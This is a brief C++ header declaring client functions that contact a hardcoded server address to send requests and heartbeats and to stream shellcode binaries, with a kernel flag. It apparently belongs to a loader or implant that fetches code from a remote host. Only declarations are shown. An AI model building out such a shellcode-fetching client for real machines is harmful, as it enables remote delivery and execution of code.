#pragma once

#include <cstdint>
#include <packets.hpp>
#include <vector>

#define SERVER_HOST "192.168.109.130"
#define SERVER_PORT "8881"

namespace server {
	bool sendServer(request_header_t* request, response_header_t** response = nullptr);
	bool sendHeartbeat(bool _internal, bool kernel);
	bool streamShellcode(shellcode_type_e type, std::vector<uint8_t>* binary);
}